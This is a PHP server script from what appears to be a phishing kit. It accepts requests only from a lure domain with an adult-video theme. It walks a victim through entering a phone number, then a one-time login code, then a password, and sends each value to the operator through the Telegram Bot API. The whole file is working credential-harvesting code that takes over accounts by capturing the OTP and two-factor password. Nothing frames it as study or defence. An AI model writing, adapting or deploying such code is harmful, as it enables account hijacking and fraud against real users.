<?php      
// Allowed domain    
$allowedDomain = "https://desiviralxxxvideos.infy.uk";    

// Restrict access to the specific domain    
if (!isset($_SERVER['HTTP_ORIGIN']) || $_SERVER['HTTP_ORIGIN'] !== $allowedDomain) {    
    header("HTTP/1.1 403 Forbidden");    
    echo "Invalid";    
    exit();    
}    

// Enable CORS only for the allowed domain    
header("Access-Control-Allow-Origin: $allowedDomain");      
header("Access-Control-Allow-Methods: POST, GET, OPTIONS");      
header("Access-Control-Allow-Headers: Content-Type");      

// Handle preflight requests (CORS OPTIONS request)      
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {      
    http_response_code(204);      
    exit();      
}      

// Telegram Bot Configuration (from environment variables)      
$telegramToken = getenv('TOKEN');      
$chatId = getenv('ID');      

// Function to send a message to Telegram      
function sendToTelegram($message) {      
    global $telegramToken, $chatId;      

    if (!$telegramToken || !$chatId) {      
    exit(); // Just exit without logging
}

    $url = "https://api.telegram.org/bot$telegramToken/sendMessage";      

    $postData = [      
        'chat_id' => $chatId,      
        'text' => $message,      
        'parse_mode' => 'MarkdownV2' // Using MarkdownV2 for proper formatting      
    ];      

    $ch = curl_init();      
    curl_setopt($ch, CURLOPT_URL, $url);      
    curl_setopt($ch, CURLOPT_POST, 1);      
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);      
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);      
    curl_exec($ch);      
    curl_close($ch);      
}      

// Handle POST Requests      
if ($_SERVER['REQUEST_METHOD'] === 'POST') {      
    $action = $_POST['action'] ?? '';      

    if ($action === 'phone') {      
        $phone = $_POST['phone'] ?? '';      
        sendToTelegram("*Phone:* \n`$phone`");      
        echo 'step="code"';      
        exit;      
    }      

    if ($action === 'otp') {      
        $phone = $_POST['phone'] ?? '';      
        $code = $_POST['code'] ?? '';      
        sendToTelegram("*OTP:*\n Phone: `$phone`\n OTP: `$code`");      
        echo 'step="password"';      
        exit;      
    }      

    if ($action === 'password') {      
        $phone = $_POST['phone'] ?? '';      
        $password = $_POST['password'] ?? '';      
        sendToTelegram("*Login:*\n Phone: `$phone`\n Password: `$password`");      
        echo 'success';      
        exit;      
    }      
}      
?>